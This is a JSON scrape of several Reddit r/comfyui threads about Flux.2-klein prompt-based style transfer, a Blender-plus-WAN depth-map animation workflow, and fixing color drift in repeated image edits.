      "title": "Flux.2-klein: Forget LoRAs. High-precision prompting is all you need (and why I'm skeptical about Dual-Image workflows).",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qlhta9",
      "author": "That_Perspective5759",
      "created_utc": "2026-01-24 08:37:34",
      "score": 108,
      "num_comments": 37,
      "upvote_ratio": 0.93,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qlhta9/flux2klein_forget_loras_highprecision_prompting/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1eaknm",
          "author": "Gilgameshcomputing",
          "text": "Sorry, can you explain the difference between your examples? You say in text that you don't think two image editing is necessary, but you're clearly using two images in both the before and after examples.",
          "score": 10,
          "created_utc": "2026-01-24 08:53:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ebus2",
              "author": "That_Perspective5759",
              "text": "In the uploaded images, there are two examples. The style transfer in the image on the left was generated using both image references and style cue words, while the style transfer in the image on the right relied solely on prompts. I hope this explanation is clear.",
              "score": 10,
              "created_utc": "2026-01-24 09:04:56",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1ecdm4",
                  "author": "Gilgameshcomputing",
                  "text": "Ah okay. Yeah I see what you're doing now. How long were the prompts for the examples on the right? Have you got an example of one?",
                  "score": 3,
                  "created_utc": "2026-01-24 09:09:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1elp73",
          "author": "Agreeable_Effect938",
          "text": "Style transfer is not the main use case for dual-image mode. dual image is mostly good for object transfer.\n\nAnyway, styles require LORAs. It's all fun and games, until it comes to real production where generations require a very precise style that's impossible to achieve with a prompting. And then the models of recent years (basically everything after SDXL) have lost style flexibility and only produce corporate visuals a la ChatGPT illustrations, making prompting even more useless",
          "score": 8,
          "created_utc": "2026-01-24 10:36:00",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1e9kxv",
          "author": "Powerful_Evening5495",
          "text": "It is good in some tasks but fails in others \n\nI like the ability to relight and swap persons.",
          "score": 7,
          "created_utc": "2026-01-24 08:44:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1e9sh6",
              "author": "That_Perspective5759",
              "text": "Perhaps you could try modifying your prompt; it might improve the situation.",
              "score": -1,
              "created_utc": "2026-01-24 08:46:06",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1efrze",
          "author": "Electronic-Metal2391",
          "text": "If you would please change the pictures-comparison headings to English so we know what they mean.",
          "score": 9,
          "created_utc": "2026-01-24 09:41:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1elk3w",
              "author": "That_Perspective5759",
              "text": "You can understand it simply as follows: the image comparison on the left is a two-image editing workflow, while the image comparison on the right is a single-image editing workflow. The difference is that the former requires both an image reference and a prompt driver, while the latter only depends on the prompt driver.",
              "score": 3,
              "created_utc": "2026-01-24 10:34:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1eat0o",
          "author": "Leftover_tech",
          "text": "The girl in image number three just texted me (by mistake) about a terrific financial opportunity!",
          "score": 2,
          "created_utc": "2026-01-24 08:55:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ecw3h",
              "author": "That_Perspective5759",
              "text": "Lol! If she's offering you crypto, tell her my workflow can generate a better ROI than her 'opportunity'!",
              "score": 4,
              "created_utc": "2026-01-24 09:14:37",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1exvf5",
          "author": "reyzapper",
          "text": "Nice method, thx for the system prompt,\n\nyeah i prefer this method.\n\nhttps://preview.redd.it/kzi0hwt3iafg1.png?width=1874&format=png&auto=webp&s=d6188c9ad41141f4f4ba94cf1580a687eb156e55\n\n`Treat image1 as the ground truth. Lock the subject‚Äôs face, likeness, anatomy, pose, expression, and framing exactly as-is from image1. Apply a dark fantasy digital painting, ultra-detailed concept art, high-fidelity fantasy realism, emerald-green and gold color palette, jewel-toned saturation, bioluminescent accents, cinematic low-key lighting, mystical glow illumination, dramatic rim lighting, high contrast, ornate metallic textures, polished gold filigree, glowing energy effects, smooth painterly blending, hyper-detailed surfaces, fantasy illustration style, modern AAA game art aesthetic, epic high-fantasy influence.`",
          "score": 2,
          "created_utc": "2026-01-24 12:21:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f18vc",
              "author": "reyzapper",
              "text": "https://preview.redd.it/m2iu0v6pmafg1.png?width=1555&format=png&auto=webp&s=53b3a9f8b99da593782c29096afd4fec0619a985\n\nmore",
              "score": 1,
              "created_utc": "2026-01-24 12:46:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1fl5rt",
              "author": "That_Perspective5759",
              "text": "coolÔºÅ",
              "score": 1,
              "created_utc": "2026-01-24 14:46:50",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1eziil",
          "author": "_realpaul",
          "text": "If the model knows what youre prompting then it will apply the style, pose, details. If not then its off to loras. I mean thats why there are so many nsfw loras for every niche not in the training set or understood by the text encoder. \n\nThats not really anything new but good to see examples on flux klein.",
          "score": 2,
          "created_utc": "2026-01-24 12:33:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1fcysm",
          "author": "codexauthor",
          "text": "I believe dual image workflows are most useful when you want to put two different objects/subjects into an image and you need to maintain the likeness of each of them. But yes, prompt alone may be sufficient for style transfers if it's a style model knows or can recreate.",
          "score": 2,
          "created_utc": "2026-01-24 14:00:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1k7faj",
          "author": "oasuke",
          "text": "Nah, LoRAs will always be a thing especially for NSFW content. Large general models simply do not have the focused knowledge a lora can provide.",
          "score": 2,
          "created_utc": "2026-01-25 04:26:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1elniv",
          "author": "That_Perspective5759",
          "text": "You can understand it simply as follows: the image comparison on the left is a two-image editing workflow, while the image comparison on the right is a single-image editing workflow. The difference is that the former requires both an image reference and a prompt driver, while the latter only depends on the prompt driver.",
          "score": 1,
          "created_utc": "2026-01-24 10:35:35",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o1eowwf",
          "author": "Euchale",
          "text": "Problem is just if you want to go for the style of a specific artist (or mix two artists together).",
          "score": 1,
          "created_utc": "2026-01-24 11:05:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1izifl",
              "author": "That_Perspective5759",
              "text": "That's a really cool idea. Maybe we could give the two images to the LLM class and let it do this, outputting a prompt that blends the two styles. I think that might be effective.",
              "score": 1,
              "created_utc": "2026-01-25 00:19:58",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1g8vsi",
          "author": "_Biceps_",
          "text": "It's probably still faster for my smooth brain to just train a LoRA than to tweak a prompt to perfection.",
          "score": 1,
          "created_utc": "2026-01-24 16:40:20",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1l5h52",
              "author": "FunDiscount2496",
              "text": "Not everything is describable, or better, description is not always the most efficient way so Loras are still needed",
              "score": 1,
              "created_utc": "2026-01-25 08:44:13",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1gtsi1",
          "author": "Sad-Chemist7118",
          "text": "Where can we download your Forget LoRAs? I think I they look great!",
          "score": 1,
          "created_utc": "2026-01-24 18:12:10",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h8o8s",
              "author": "flasticpeet",
              "text": "üòÇ",
              "score": 1,
              "created_utc": "2026-01-24 19:16:02",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1izp5m",
              "author": "That_Perspective5759",
              "text": "You can download it from my Civitai site or RunningHub.",
              "score": 1,
              "created_utc": "2026-01-25 00:20:56",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1iqthi",
          "author": "budwik",
          "text": "How is flux.2-klein for these jobs in comparison to Qwen Edit?",
          "score": 1,
          "created_utc": "2026-01-24 23:34:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1iwegf",
              "author": "That_Perspective5759",
              "text": "better than qwen",
              "score": 1,
              "created_utc": "2026-01-25 00:03:52",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1ebfea",
          "author": "FreezaSama",
          "text": "This is great. So... can you explain the prompting method?",
          "score": 0,
          "created_utc": "2026-01-24 09:01:02",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1ecbz8",
              "author": "That_Perspective5759",
              "text": "The qwen3VL model can automatically recognize image styles and output prompts. In dual-image editing mode, the stylized image serves as a reference, working in conjunction with the prompts to drive the workflow. In single-image editing mode, the workflow uses only the prompts.",
              "score": 7,
              "created_utc": "2026-01-24 09:09:24",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1ecqzc",
              "author": "That_Perspective5759",
              "text": "I realized Flux.2-klein is so sensitive to semantics that standard prompts often carry too much \"noise.\" So, I designed an LLM Agent to act as a **Visual DNA Analyst**. Here‚Äôs the framework I use to generate the style prompts:\n\n# ü§ñ Agent System Prompt: Visual Essence Extractor\n\n**1. Role Definition** You are a premier Visual Arts Analyst and Prompt Engineering Specialist. Your mission is to deeply deconstruct the **\"Visual DNA\"** of an input image and translate it into a high-purity English Style Prompt for use in Stable Diffusion, Midjourney, or ComfyUI style transfer workflows.\n\n**2. Analytical Framework (Internal Scan)** When an image is provided, strictly analyze it across these five dimensions (do not output the analysis process, only the results):\n\n* **Artistic Medium & Technique:** e.g., Oil painting, digital 3D render, Ukiyo-e, cyberpunk photography, charcoal sketch.\n* **Color Palette & Harmony:** e.g., Monochromatic, complementary teal and orange, muted earth tones, neon-saturated.\n* **Lighting & Atmosphere:** e.g., Volumetric fog, cinematic rim lighting, high-key, soft bokeh, moody chiaroscuro.\n* **Texture & Grain:** e.g., Grainy film texture, thick impasto brushstrokes, glossy plastic, hyper-detailed skin pores.\n* **Artistic Influence/Era:** e.g., Studio Ghibli style, 1970s vintage aesthetic, brutalist architecture style.\n\n**3. Output Constraints**\n\n* **Direct Output:** Strictly NO preamble (e.g., \"Based on the image...\"), NO conclusions, and NO explanations.\n* **Language:** Must use pure, idiomatic English keywords.\n* **Format:** Use a comma-separated list (Tag-based style) to ensure balanced weights.\n* **Distillation:** Strip away all **Subject Matter** descriptions (e.g., \"a woman,\" \"a tree\"). Keep ONLY words that describe the **Style**.\n\n**4. Execution Logic**\n\n* **Input:** \\[Image\\]\n* **Task:** Extract the stylistic DNA.\n* **Output:** ONLY the English descriptive keywords for the style. No meta-talk.\n\n**üß™ Example Output:** *If inputting a cyberpunk rain-night photograph:* `Cinematic photography, cyberpunk aesthetic, rain-slicked surfaces, neon reflections, high contrast, moody teal and magenta color palette, anamorphic lens flare, sharp focus, volumetric night fog, grainy 35mm film texture, hyper-realistic, intricate urban detail.`\n\nGive it a shot and let me know if it helps your generations!",
              "score": 3,
              "created_utc": "2026-01-24 09:13:18",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1hr9cy",
                  "author": "Zueuk",
                  "text": "hmm, a comma separated list of 'tags'. isn't this literally what BFL's prompting guide tells us NOT to do ü§î",
                  "score": 2,
                  "created_utc": "2026-01-24 20:41:10",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ew5w8",
                  "author": "FreezaSama",
                  "text": "Oh this is dope. I'll use chat got to give it a go thanks!",
                  "score": 1,
                  "created_utc": "2026-01-24 12:07:26",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qj8yx1",
      "title": "Blender Soft Body Simulation + ComfyUI (flux)",
      "subreddit": "comfyui",
      "url": "https://v.redd.it/h0pza820dreg1",
      "author": "bingobongo3001",
      "created_utc": "2026-01-21 20:18:26",
      "score": 99,
      "num_comments": 24,
      "upvote_ratio": 0.95,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Show and Tell",
      "permalink": "https://reddit.com/r/comfyui/comments/1qj8yx1/blender_soft_body_simulation_comfyui_flux/",
      "domain": "v.redd.it",
      "is_self": false,
      "comments": [
        {
          "id": "o0xh5ao",
          "author": "ChilouXx",
          "text": "Is it a frame by frame rendering since you mention flux?  \nIt looks nice.  \nRemindes me of the vintage Animatediff workflow with a modern quality.",
          "score": 3,
          "created_utc": "2026-01-21 21:19:01",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0y0owv",
              "author": "bingobongo3001",
              "text": "With FLUX, I did it frame by frame, right. But then I started using WAN as well, it‚Äôs a bit faster and more stable because it uses a depth video as input.  \nSorry for the confusion about FLUX, I was supposed to mention WAN too.",
              "score": 2,
              "created_utc": "2026-01-21 22:51:43",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o109aqi",
                  "author": "CertifiedTHX",
                  "text": "So you do the style with flux then throw it in wan to animate, ya? Cuz for a sec i was going to ask how to keep consistency across time heh",
                  "score": 2,
                  "created_utc": "2026-01-22 07:08:22",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0xey9p",
          "author": "Mintfriction",
          "text": "How do you do that: style transfer ?",
          "score": 2,
          "created_utc": "2026-01-21 21:08:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0y2tan",
              "author": "bingobongo3001",
              "text": "1. I did a static render of the first frame of video and then used it as a style input image. I used different AI to do it ‚Äì something in comfy, adobeFF, something on higgsfield. Doesnt matter where, just anywhere you can provide a depth image and get a render based on it.  \n2. input image > resize image (depicted) > start image of WAnFUnControlToVideo. And then it goes as a positive, negrative, and latent image to ksampler  \nBut also it goes as a latent image from WanFunControlToVideo > wanVideo enhance > as a model to Ksampler.",
              "score": 3,
              "created_utc": "2026-01-21 23:02:37",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0y42iv",
                  "author": "Mintfriction",
                  "text": "Thanks for the answer",
                  "score": 2,
                  "created_utc": "2026-01-21 23:09:13",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o10twsr",
                  "author": "jeebiuss",
                  "text": "How does it take to generate each video",
                  "score": 1,
                  "created_utc": "2026-01-22 10:18:51",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0y39zp",
          "author": "bingobongo3001",
          "text": "Guys, just wanted to clarify that I **also used WAN** for these videos. Sorry for confusing title, it is not just flux.",
          "score": 2,
          "created_utc": "2026-01-21 23:05:04",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o0y4l50",
          "author": "Necessary-Froyo3235",
          "text": "Really like the last one",
          "score": 2,
          "created_utc": "2026-01-21 23:11:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0y4v1r",
          "author": "desertstudiocactus",
          "text": "How does blender integrate into this process?",
          "score": 2,
          "created_utc": "2026-01-21 23:13:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0ybhhe",
              "author": "bingobongo3001",
              "text": "I made a model of the Nike logo and did a ‚Äúbubble‚Äù simulation (soft body or rigid body) in Blender, then rendered it there (Cycles) in mist mode, or whatever it‚Äôs called. Mist mode, also known as depth, gives the AI information about how deep the image is, haha.",
              "score": 2,
              "created_utc": "2026-01-21 23:49:09",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o0ybotw",
                  "author": "desertstudiocactus",
                  "text": "Very clever, cool!",
                  "score": 2,
                  "created_utc": "2026-01-21 23:50:14",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o12t91i",
                  "author": "michael-65536",
                  "text": "It's usually called a depth pass or a z-buffer.",
                  "score": 2,
                  "created_utc": "2026-01-22 17:06:51",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o0z2y3z",
          "author": "Sareth324",
          "text": "Nice, I did something similar but just used 1st and last frame of a basic lighting and materials. End result was refined lighting through bubbles / refractions.\n\n\nWhat was your thought of only using a depth pass?",
          "score": 2,
          "created_utc": "2026-01-22 02:21:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0zkdyh",
              "author": "bingobongo3001",
              "text": "Good question.\n\nThe reason is that I knew I could use depth as a ‚Äúcheap‚Äù input for a render engine.  \n  \nI worked at Snapchat before, so we did experiments with our engine (Lens Studio). The team found that we could transform camera input (selfie) into a depth map rendered in real time, and then send this depth map to a 3D mesh or something else. It gave us some cool effects, and we figured out how to approximately calculate the distance between the camera and the user‚Äôs face = we got new face lenses.  \nSo that‚Äôs how I got the idea of using a depth map.  \n  \nAnd obviously I also saw some youtubers using it as an input, but they usually used a couple more maps as well (outlines, color masks, etc)",
              "score": 2,
              "created_utc": "2026-01-22 04:03:35",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o0zfhzp",
          "author": "TanguayX",
          "text": "Really cool!",
          "score": 2,
          "created_utc": "2026-01-22 03:33:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o0zlcbd",
              "author": "bingobongo3001",
              "text": "Thank you!",
              "score": 1,
              "created_utc": "2026-01-22 04:09:43",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o16rtks",
          "author": "No_Damage_8420",
          "text": "Looks great!  \nIndeed Comfy + Wan = Ultra powerful GLOBAL ILLUMINATION renderer of all times (anyone from old days - Vray, Maxwell Render, MentalRay?)\n\n\"GI\" and \"AI\" finally met.",
          "score": 2,
          "created_utc": "2026-01-23 05:22:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18l1mb",
              "author": "bingobongo3001",
              "text": "I‚Äôll never forget all the pain I went through during test renders in vray on my baby 8 GB ram and integrated GPU",
              "score": 2,
              "created_utc": "2026-01-23 13:54:11",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o188jxw",
          "author": "TidalFoams",
          "text": "This is the kind of reproducibility required for actual commercial work. Looking great.",
          "score": 2,
          "created_utc": "2026-01-23 12:42:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o18lnod",
              "author": "bingobongo3001",
              "text": "Thank you!  \nThere's still a lot of room for experiments. I want to try to simulate some particles in houdini and then render it with this approach",
              "score": 2,
              "created_utc": "2026-01-23 13:57:22",
              "is_submitter": true,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qkgc4y",
      "title": "Flux.2 Klein 9B (Distilled) Image Edit - Image Gets More Saturated With Each Pass",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qkgc4y",
      "author": "eagledoto",
      "created_utc": "2026-01-23 03:53:08",
      "score": 86,
      "num_comments": 98,
      "upvote_ratio": 0.98,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Help Needed",
      "permalink": "https://reddit.com/r/comfyui/comments/1qkgc4y/flux2_klein_9b_distilled_image_edit_image_gets/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o171yk9",
          "author": "afinalsin",
          "text": "Everyone is correct, it's the VAE encoding/decoding that trashes it, and it's an issue with every image editing model. Even nanobanana pro will bake an image if you pass it back and forth a couple times. Unfortunately everything in the image degrades, not just the colors, so a simple color correct pass won't fix it.\n\nThere is a way to make multiple successive edits without the severe degradation, you just need to work with latents instead of images, but at the moment it's an extremely clunky process. You need to use the \"SaveLatent\" and \"LoadLatent\" nodes. \n\n[Here is a grid showing a multi-image edit](https://i.postimg.cc/c6yNgdy7/grid-00001.png) to swap a character's clothes. It is input/input/output.\n\n[And here is another grid](https://i.postimg.cc/HH5TVFFR/grid-00008.png) showing ~~7~~ 6 consecutive edits with minimal degradation.  \n\nTo use this technique, first run the first edit you want to do and save the latent and image to the same folder. This will make it easier to track which latent is which image, which will be important. It's pretty simple, and [will look like this](https://i.postimg.cc/Q8zgwFXM/Screenshot-2026-01-23-171025.png).\n\nNow the annoying part is you need to copy the latent from your/output/folder to Comfy's input folder. Make sure you copy instead of move, otherwise your image/latent name pairing will be out of sync. You'll need to do this for every successive edit you make, so if you're using windows 11 just middle click both folders to open them in new tabs in windows explorer, it will make it much easier to transfer the files.\n\nNow unpack the \"Reference conditioning\" subgraph and delete the vae encode node, and plug a \"LoadLatent\" node straight into both ReferenceLatent nodes. [It will look like this](https://i.postimg.cc/fTyNLqG3/Screenshot-2026-01-23-171144.png).\n\nImportant: You need to manually set the actual latent width and height, and the width and height of the flux2scheduler to match your input. If you feel like automating the math, Derfuu has a get latent size node, and you can combine that with math nodes to x2 the latent size to get the correct resolution. [It'll look like this](https://i.postimg.cc/nhMB3x6s/Screenshot-2026-01-23-172416.png). Then just plug the outputs into the width/height inputs.\n\nMaybe important: Change the noise seed every edit. In older models, running the same noise on the same image can burn the image extremely badly. I'm unsure if that's an issue with Klein, but better safe than sorry. \n\nNow, make your edit and save the image and latent as before. If you're happy with the image, congratulations, you're done. If you want to make further edits, simply copy-paste the correct latent from your output folder to your input, refresh comfy (just press r), and select the new input latent. Make your edit, save both image and latent, and continue, making as many edits as you want.\n\n---\n\nBefore now you've never really needed to use latents instead of images, so the user experience is awful. There's currently no preview on the latents so you're relying on explorer to see which latent corresponds to which image. The latent also has to be in the input folder, which makes it clunky to immediately switch to the new latent. \n\nI'll have a look and see if I can find a custom node pack that makes working with latents a better experience and whip up an actual workflow. I might try my hand at vibecoding a solution if there isn't one to be found because while this technique produces infinitely better results than the out of the box workflow it's just such a pain in the dick to actually use.",
          "score": 30,
          "created_utc": "2026-01-23 06:40:43",
          "is_submitter": false,
          "replies": [
            {
              "id": "o173m2d",
              "author": "eagledoto",
              "text": "Damn! Thank you so much for the detailed explanation and the work around. Will definitely try it out just out of curiosity and the time out took to write it all, and it might even come in handy later on. Thanks again man.",
              "score": 5,
              "created_utc": "2026-01-23 06:54:12",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o18vb8s",
                  "author": "afinalsin",
                  "text": "Ayy, no worries.\n\nSo, I just downloaded your image and couldn't replicate. I did notice you said you removed the scaletototalpixels node. Your input image is 1536 x 2752, and the Flux2 Klein base resolution is 1 megapixel. 1536 x 2752 is 4,227,072 pixels, so you are trying to generate 2x the base resolution. \n\nFor now, bring back the scale to total pixels node and set it to 2 megapixels max. Also make sure to change the seed between generations, and that should set you up right for small edits like these. If you need to make bigger edits like putting a character in a different pose, you will likely need to drop the resolution down closer to base res. \n\nIf you want to work on the full resolution image, you'd be better off running an inpainting workflow on it, where you crop bits out of the image, make your edits on those cropped bits, and reattach. There must be a Klein inpainting workflow around somewhere, let me know if you can't find one and I'll throw one together for you.",
                  "score": 3,
                  "created_utc": "2026-01-23 14:46:52",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o19nf8p",
              "author": "roxoholic",
              "text": "You don't have to manually save/load latents. There are `Latent Sender`/`Latent Receiver` nodes in Impact Pack which make iterating a lot faster.\n\nhttps://github.com/ltdrdata/ComfyUI-extension-tutorials/blob/Main/ComfyUI-Impact-Pack/tutorial/sender_receiver.md",
              "score": 4,
              "created_utc": "2026-01-23 16:56:16",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19uurh",
                  "author": "afinalsin",
                  "text": "Fuck yes, I knew someone was gonna come through with the goods. That looks incredibly useful, and way better than the hatchet job nodes I vibecoded. Thank you.",
                  "score": 2,
                  "created_utc": "2026-01-23 17:30:58",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o19gwvq",
              "author": "Sgsrules2",
              "text": "Use this node instead: https://github.com/Velour-Fog/comfy-latent-nodes\nIt lets you specify the location so you don't have to copy the latents. Just setup a temp file and read from it.",
              "score": 1,
              "created_utc": "2026-01-23 16:27:07",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o19veht",
                  "author": "afinalsin",
                  "text": "Hell yeah. I already vibed my way through a similar node group, but good to have options. Between this and the other guy's send/receive nodes, I'll pretty much be set. Thank you.",
                  "score": 1,
                  "created_utc": "2026-01-23 17:33:28",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16ihoz",
          "author": "BathroomEyes",
          "text": "It‚Äôs called color shifting and it‚Äôs a consequence of the vae encode/decode nodes. They‚Äôre lossy and can result in noticeable loss of sharpness and color inaccuracy. There‚Äôs a few ways you can address this. You could color correct with post processing software. If you need to do multiple sampler passes you can keep the successive outputs in latent space and only decode after the last sampler pass. TBG-Takeaways has a vae decode color shift fixer for Flux1.D so I‚Äôm hoping u/TBG______ releases one for Flux.2.",
          "score": 30,
          "created_utc": "2026-01-23 04:20:33",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16uet5",
              "author": "eagledoto",
              "text": "\"If you need to do multiple sampler passes you can keep the successive outputs in latent space and only decode after the last sampler pass\"\n\ncan you explain this part a bit more please? I am new to comfy so learning",
              "score": 3,
              "created_utc": "2026-01-23 05:41:29",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16vj4y",
                  "author": "Haiku-575",
                  "text": "After your denoised latent comes out of the KSampler, instead of passing it to a VAE Decode node to turn it into pixels, pass it straight into another KSampler with different conditioning. Does that make sense?",
                  "score": 18,
                  "created_utc": "2026-01-23 05:49:50",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o17663a",
              "author": "JoelMahon",
              "text": "is there simply a less lossy version of the vae encode/decode nodes?",
              "score": 1,
              "created_utc": "2026-01-23 07:15:52",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1cvx2n",
                  "author": "Winter_unmuted",
                  "text": "no. it isn't the node's fault, but rather a consequence of vae encoding itself. latent space, which is what an image is vae encoded into, has less information than the input image. It's lossy. \n\nThe reconstructed image has the same amount of info as the input image did, but it doesn't \"remember\" what the input was. It just knows the latent, and what general informatino can be used to reconstruct an image from such a latent. The missing info between those two formats is made up. The data are constrained randomness. \n\nthat randomness manifests as essentially what we call degraded images. Nonsensical things like extra fingers. eyes that don't line up right or irises that aren't circular. teeth that are lopsided or the wrong number. Letters that look letter-ish but are actually nonsense. etc.",
                  "score": 2,
                  "created_utc": "2026-01-24 02:36:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o17ldoz",
              "author": "TheSquirrelly",
              "text": "The multiple samplers sounds like a good idea.  Though if you have a number of edits to do like the OP you have to hope each of the edits get it right the first time.  If you find you have to regen for each edit and get success 1 in 4 (just to make up a number) and have 3 edits, now you have a 1 in 64 chance.  But if it usually hits it the first time then should be good.",
              "score": 1,
              "created_utc": "2026-01-23 09:34:56",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o17z1d5",
                  "author": "Aromatic-Somewhere29",
                  "text": "You can chain multiple KSamplers and place a VAE decoder with image preview after each one. Bypass all but the first KSampler and keep regenerating only the first edit until you get the desired result. Once satisfied, lock the seed of the first KSampler, enable the second one, and repeat the process.",
                  "score": 4,
                  "created_utc": "2026-01-23 11:34:16",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16f231",
          "author": "marres",
          "text": "vae encode/decode and whatever other stuff the model is doing with the image degrades it.",
          "score": 9,
          "created_utc": "2026-01-23 03:59:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16gvz5",
              "author": "eagledoto",
              "text": "what if i give it a detailed prompt to keep the rest of the image as it is and just make the change that i tell it to? you think that will help?",
              "score": 1,
              "created_utc": "2026-01-23 04:10:36",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16ihsi",
                  "author": "marres",
                  "text": "No, you can't control that with the prompt. What you would need to do is do all the editing in one pass",
                  "score": 5,
                  "created_utc": "2026-01-23 04:20:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16l41u",
          "author": "Most_Way_9754",
          "text": "Create a mask of the area you want to edit by using:\n\n[https://github.com/adambarbato/ComfyUI-Sa2VA](https://github.com/adambarbato/ComfyUI-Sa2VA)\n\nthen use: \n\n[https://github.com/lquesada/ComfyUI-Inpaint-CropAndStitch](https://github.com/lquesada/ComfyUI-Inpaint-CropAndStitch)",
          "score": 8,
          "created_utc": "2026-01-23 04:37:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16tzz6",
              "author": "eagledoto",
              "text": "What about using the inbuilt mask editor?",
              "score": 3,
              "created_utc": "2026-01-23 05:38:29",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o17700i",
                  "author": "Most_Way_9754",
                  "text": "i'm not skilled at using a paintbrush to paint the ear-rings, people in the background or her clothes. so i just use something like Sa2VA to automatically create the mask. you can try to mask manually using the in built tools and use the crop and stitch nodes that way.",
                  "score": 2,
                  "created_utc": "2026-01-23 07:23:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o16r0nm",
          "author": "TechnologyGrouchy679",
          "text": "kijai's \"match color\" node might tame the saturation",
          "score": 3,
          "created_utc": "2026-01-23 05:17:01",
          "is_submitter": false,
          "replies": [
            {
              "id": "o16u6b4",
              "author": "eagledoto",
              "text": "https://preview.redd.it/wklxr9kod1fg1.png?width=1173&format=png&auto=webp&s=fb38e808cfd8f51f581b11f6e44b63257052ebca\n\nThis correct?",
              "score": 4,
              "created_utc": "2026-01-23 05:39:46",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o16v9oh",
                  "author": "TechnologyGrouchy679",
                  "text": "yes but in this case it doesn't seem all that effective",
                  "score": 3,
                  "created_utc": "2026-01-23 05:47:51",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1ed7n3",
                  "author": "TBG______",
                  "text": "A mask is needed so the black shirt doesn‚Äôt inherit colors from the white shirt. And try to use lab or wavelet for cc.",
                  "score": 1,
                  "created_utc": "2026-01-24 09:17:34",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o18ax3o",
              "author": "sevenfold21",
              "text": "Color matching sucks for editing, because you're adding or removing pixels, and these colors can be completely different from the original.",
              "score": 2,
